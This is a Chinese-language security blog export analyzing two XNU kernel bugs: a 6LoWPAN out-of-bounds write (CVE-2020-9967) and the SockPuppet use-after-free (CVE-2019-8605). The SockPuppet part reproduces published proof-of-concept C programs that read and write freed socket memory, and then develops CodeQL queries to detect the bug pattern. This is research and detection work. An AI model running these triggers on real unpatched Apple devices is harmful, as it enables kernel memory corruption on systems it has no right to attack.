<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 6lowpan input routine.</span></span><br><span class="line"><span class="comment"> * Decapsulate the 802.15.4 Data Frame</span></span><br><span class="line"><span class="comment"> * Header decompression on the payload</span></span><br><span class="line"><span class="comment"> * Pass the mbuf to the IPV6 protocol stack using proto_input()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sixlowpan_input</span><span class="params">(<span class="keyword">ifnet_t</span> p, __unused <span class="keyword">protocol_family_t</span> protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">mbuf_t</span> m, __unused <span class="keyword">char</span> *frame_header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">frame802154_t</span>      ieee02154hdr;</span><br><span class="line">    <span class="keyword">u_int8_t</span>           *payload = <span class="literal">NULL</span>;</span><br><span class="line">    if6lpan_ref        ifl = <span class="literal">NULL</span>;</span><br><span class="line">    bpf_packet_func    bpf_func;</span><br><span class="line">    <span class="keyword">mbuf_t</span> mc, m_temp;</span><br><span class="line">    <span class="keyword">int</span> off, err = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int16_t</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an mbuf cluster for the 802.15.4 frame and uncompressed payload */</span></span><br><span class="line">    mc = m_getcl(M_WAITOK, MT_DATA, M_PKTHDR);</span><br><span class="line">    <span class="keyword">if</span> (mc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;len, mtod(m, <span class="keyword">u_int8_t</span> *), <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    len = ntohs(len);**                     <span class="comment">// This is the size read from the frame on the wire. </span></span><br><span class="line">    m_adj(m, <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    <span class="comment">/* Copy the compressed 802.15.4 payload from source mbuf to allocated cluster mbuf */</span></span><br><span class="line">    <span class="keyword">for</span> (m_temp = m, off = <span class="number">0</span>; m_temp != <span class="literal">NULL</span>; m_temp = m_temp-&gt;m_next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m_temp-&gt;m_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            m_copyback(mc, off, m_temp-&gt;m_len, mtod(m_temp, <span class="keyword">void</span> *));</span><br><span class="line">            off += m_temp-&gt;m_len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = p_6lowpan_ifnet;</span><br><span class="line">    mc-&gt;m_pkthdr.rcvif = p;</span><br><span class="line"></span><br><span class="line">    sixlowpan_lock();</span><br><span class="line">    ifl = ifnet_get_if6lpan_retained(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ifl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (if6lpan_flags_ready(ifl) == <span class="number">0</span>) &#123;</span><br><span class="line">        if6lpan_release(ifl);</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bpf_func = ifl-&gt;if6lpan_bpf_input;</span><br><span class="line">    sixlowpan_unlock();</span><br><span class="line">    if6lpan_release(ifl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bpf_func) &#123;</span><br><span class="line">        bpf_func(p, mc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the 802.15.4 frame header */</span></span><br><span class="line">    bzero(&amp;ieee02154hdr, <span class="keyword">sizeof</span>(ieee02154hdr));</span><br><span class="line">    frame802154_parse(mtod(mc, <span class="keyword">uint8_t</span> *), len, &amp;ieee02154hdr, &amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX Add check for your link layer address being dest */</span></span><br><span class="line">    sixxlowpan_input(&amp;ieee02154hdr, payload);</span><br></pre></td></tr></table></figure>

<ol>
<li><code>m_getcl</code> 分配mc(mbuf cluster)来存放要处理的 802.15.4 f帧和未解压的payload</li>
<li>拷贝未解压的802.15.4 payload 到新分配的mc中</li>
</ol>
<p>len 是从参数 mbuf m 中读取得到的，这是一个可控的值，在后面解析逻辑: <strong><code>frame802154_parse</code> ，这个长度是直接使用的。</strong></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2015.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2015.png"></p>
<p>因为我们可以将len控制在0-0xffff之间，所以我们可以使pf-&gt;payload_len为负值(to-header len)，小于预期的大小，或者大于mc中输入数据本身的大小。</p>
<p>随后的调用是 <strong><code>sixxlowpan_input(&amp;ieee02154hdr, payload);</code></strong> </p>
<p>这个函数直接使用了 之前解析出来的pf 和 payload。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">errno_t</span></span></span><br><span class="line"><span class="function"><span class="title">sixxlowpan_input</span><span class="params">(struct frame802154 *ieee02154hdr, <span class="keyword">u_int8_t</span> *payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">errno_t</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    error = sixxlowpan_uncompress(ieee02154hdr, payload);</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * TO DO: fragmentation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后走到 <code>sixxlowpan_uncompress</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">errno_t</span></span></span><br><span class="line"><span class="function"><span class="title">sixxlowpan_uncompress</span><span class="params">(struct frame802154 ***ieee02154hdr**, <span class="keyword">u_int8_t</span> *payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> hdroffset;</span><br><span class="line">    <span class="keyword">size_t</span> hdrlen;</span><br><span class="line">    <span class="keyword">u_int8_t</span> hdrbuf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">errno_t</span> error;</span><br><span class="line"></span><br><span class="line">    bzero(hdrbuf, <span class="keyword">sizeof</span>(hdrbuf));</span><br><span class="line">    hdrlen = <span class="keyword">sizeof</span>(hdrbuf);</span><br><span class="line"></span><br><span class="line">    error = uncompress_hdr_hc1(ieee02154hdr, (<span class="keyword">u_int8_t</span> *)payload,</span><br><span class="line">        <span class="number">0</span>, &amp;hdroffset, &amp;hdrlen, hdrbuf); <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hdroffset &lt; <span class="number">0</span>) &#123; <span class="comment">// 1</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset negative means that we have to remove</span></span><br><span class="line"><span class="comment">         * hdrlen of extra stuff</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(&amp;payload[<span class="number">0</span>],</span><br><span class="line">            &amp;payload[hdrlen],</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len -= hdrlen;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset is the size of the compressed header</span></span><br><span class="line"><span class="comment">         * -- i.e. when the untouched data starts</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * hdrlen is the size of the decompressed header</span></span><br><span class="line"><span class="comment">         * that takes the place of compressed header of size hdroffset</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset); <span class="comment">// 2， oob write here, `ieee02154hdr-&gt; payload_len-3 = -2`</span></span><br><span class="line">        <span class="built_in">memcpy</span>(payload, hdrbuf, hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len += hdrlen - hdroffset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，如果我们将接收到的帧的len设置为0x4，则最终将计算出以下值(<code>frame802154_parse</code>)：</p>
<p><code>c</code> header length = 3 </p>
<p><code>frame-&gt;payload_len</code>= 1</p>
<p>同时，在<code>uncompress_hdr_hc1</code>函数中（at 0)，控制流程走到 <code>SICSLOWPAN_HC1_NH_UDP</code> 分支：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*hdroffset = SICSLOWPAN_HC1_HDR_LEN;  --&gt; *hdroffset = 3</span><br><span class="line">*hdrlen = UIP_IPH_LEN;                --&gt; *hdrlen = 40</span><br><span class="line">sizeof(struct ip6_hdr) = 40</span><br></pre></td></tr></table></figure>

<p>再回到上层函数<code>sixxlowpan_uncompress</code> (at 1)，hdroffset 为3，走下面的分支，能够走到 memmove调用(at 2)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset); </span><br></pre></td></tr></table></figure>

<p>where : payload + 40</p>
<p>what :  source payload buffer, 可控</p>
<p>length : ieee02154hdr-&gt;payload_len - hdroffset 即 payload_len - hdroffset = 1 - 3 = -2</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p>
<p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/aliyuncs.com/img/codeql_xnu/codeql-xnu_xnu.md">D4rkD0g/boringforever</a></p>
<p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p>
<p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>XNU</tag>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SockPuppet学习记录(一) : 漏洞分析</title>
    <url>/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><p>  这个漏洞是由pj0的 <code>nedwill</code> 发现的，而且是一个品相极佳的可以用于越狱的漏洞，本文只是对漏洞进行分析，并且思考/尝试使用CodeQL对该类型漏洞覆盖。当然，在看了原作者的<a href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">文章</a>之后，才发现nedwill是利用Fuzzing的手段发现的这个漏洞，并且在挖掘读/写原语的时候也是借助了Fuzzing的手段，可以说十分的巧妙和高效了。</p>
<span id="more"></span>

<ul>
<li><p>漏洞issue ：<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806&sort=-id&colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary&q=owner:nedwill@google.com&can=1">1806 - project-zero - Project Zero - Monorail</a></p>
</li>
<li><p>系统版本：10.14.3</p>
</li>
<li><p>xnu代码：</p>
</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/xnu.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled.png"></p>
<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><h2 id="raw-poc"><a href="#raw-poc" class="headerlink" title="raw poc"></a>raw poc</h2><p>在测试原始PoC获得的Crash信息如下：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/crash.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%201.png"></p>
<p>原始PoC使用了<code>raw socket</code>触发，但是美中不足，这个方式必须要root权限才能触发。<br>(定制化<code>sockaddr_in6</code> 需要<code>raw socket</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPPROTO_IP 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_ANY &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_LOOPBACK &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa1</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65000</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_LOOPBACK,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa2</span> =</span> &#123;</span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65001</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_ANY,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = connect(s, (<span class="keyword">const</span> sockaddr*)&amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">    res = setsockopt(s, <span class="number">41</span>, <span class="number">50</span>, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1.5: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    res = connect(s, (<span class="keyword">const</span> sockaddr*)&amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>后续ned经过研究发现可以通过tcp socket方式触发，可以用于read free’d memroy:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">TCP-based reproducer for CVE-2019-8605</span></span><br><span class="line"><span class="comment">This has the benefit of being reachable from the app sandbox on iOS 12.2.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_3542PKTINFO 46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[<span class="number">1</span>] = &#123;<span class="string">&#x27;\xaa&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> buffer_len = <span class="keyword">sizeof</span>(buffer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//get sth from ...</span></span><br><span class="line">    res = getsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, &amp;buffer_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res3: %d\n&quot;</span>, res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got %d\n&quot;</span>, buffer[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>经过nedwill的Fuzzing测试，发现了write free’d memory 的PoC：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  setoptshut.m</span></span><br><span class="line"><span class="comment">//  ExploitDev</span></span><br><span class="line"><span class="comment">//  TCP-based reproducer for CVE-2019-8605, using SONPX_SETOPTSHUT to do a</span></span><br><span class="line"><span class="comment">//  write to the freed memory. Tested on iOS 12.2.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by Ned Williamson on 6/17/19.</span></span><br><span class="line"><span class="comment">//  Copyright © 2019 Ned Williamson. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#import <span class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">&quot;AppDelegate.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_USE_MIN_MTU 42</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res0: %d\n&quot;</span>, s);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Permit setsockopt after disconnecting (and freeing socket options)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">so_np_extensions</span> <span class="title">sonpx</span> =</span> &#123;.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, <span class="keyword">sizeof</span>(sonpx));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res1: %d\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res2: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res3: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set, write sth...</span></span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;res4: %d\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @autoreleasepool &#123;</span><br><span class="line">        <span class="keyword">return</span> UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="bug-analysis"><a href="#bug-analysis" class="headerlink" title="bug analysis"></a>bug analysis</h1><p>根据漏洞描述，可以看到漏洞的 root cause如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">in6_pcbdetach</span><span class="params">(struct inpcb *inp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">        inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            m_freem(inp-&gt;in6p_options);</span><br><span class="line">            inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">        &#125;</span><br><span class="line">        ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad</span></span><br><span class="line">        ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">        <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            (<span class="keyword">void</span>) m_free(inp-&gt;inp_options); <span class="comment">// &lt;- good</span></span><br><span class="line">            inp-&gt;inp_options = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>漏洞路径 <code>bsd/netinet6/in6_pcb.c</code> ，协议族 <code>AF_INET6</code> 的处理函数，从函数名字来看是<br>断开连接时候会执行的一些操作（释放一些资源），但是释放之后忘记把指针置NULL，导致同一个套接字重连的时候又使用到了这个指针（悬垂指针）。<br>根据<code>nedwill</code>的描述，连接断开再<code>set/get socketopt</code>的场景可以触发。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/vuln_code.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%202.png"></p>
<p>进入函数之前有一个 socket <code>so_flags</code> 的检查，poc中的 <code>setsockopt()</code> 调用应该是为了能过进入漏洞逻辑设计的。</p>
<p>利用 <code>socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</code> 这个poc，逻辑应该是：</p>
<ul>
<li>创建socket连接</li>
<li>setsockopt，为了后续可以进入漏洞代码分支，同时设置要读的数据</li>
<li>disconnectx 断开连接，触发 free 逻辑</li>
<li>getsockopt，读取已经释放的内存</li>
</ul>
<p>写的逻辑类似，不过作者是找到了另外特殊的成员来完成写操作： <code>SONPX_SETOPTSHUT</code>  </p>
<p>这个洞的品相太好了  :-)</p>
<h1 id="how-to-find-by-QL"><a href="#how-to-find-by-QL" class="headerlink" title="how to find by QL"></a>how to find by QL</h1><h2 id="xnu-database"><a href="#xnu-database" class="headerlink" title="xnu database"></a>xnu database</h2><p>可以从semmle官方网站下载</p>
<p><a href="https://semmle.com/large-oss-projects">Analyzing large open source projects</a></p>
<h2 id="about-this-bug"><a href="#about-this-bug" class="headerlink" title="about this bug"></a>about this bug</h2><p>看起来是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">demo</span><span class="params">(p)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  ptr, p2; <span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    m_free(p-&gt;p1); <span class="comment">// vuln!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(xxx)&#123;</span><br><span class="line">        freem(p2);</span><br><span class="line">        p2 = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>释放了内存之后，没有对指针做置NULL处理。</p>
<ul>
<li>需要在同一个函数里，同一个代码块里。 <strong><del>锁的问题考虑吗？</del></strong></li>
<li>释放逻辑，正则匹配下， xxxfree, freexxx, releasexxx之类的</li>
</ul>
<h2 id="query-1"><a href="#query-1" class="headerlink" title="query 1"></a>query 1</h2><p>根据上面的描述，我们找到free 调用，且free调用下一行是特定的赋值表达式的情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall call, AssignExpr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">&quot;.*free.*?&quot;</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    e.getRValue().(Literal).getValue() = <span class="string">&quot;0&quot;</span> <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/query1.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%203.png"></p>
<p>这里有一个问题，我尝试过<code> free调用的参数作为赋值表达式的左值</code> 这条约束，但是加上之后就找不到任何结果了，如果有人知道原因还请指点一下 : )</p>
<h2 id="query-2"><a href="#query-2" class="headerlink" title="query 2"></a>query 2</h2><p>上面query可以找到 free后是set NULL的代码段，如果想找不满足条件的，可以检测free逻辑下一行是不是 instance of AssignExpr，当然这样比较粗糙，会存在误报。</p>
